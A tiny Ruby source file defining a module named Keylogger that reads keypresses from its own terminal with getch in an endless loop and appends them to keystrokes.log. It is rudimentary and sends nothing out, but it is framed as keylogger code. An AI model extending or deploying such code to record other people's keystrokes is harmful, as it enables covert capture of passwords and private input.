require 'io/console'

module Keylogger
  def self.keylogger
    log_file = File.open('keystrokes.log', 'a')
    loop do
      key = STDIN.getch
      log_file.write(key)
    end
  end
end
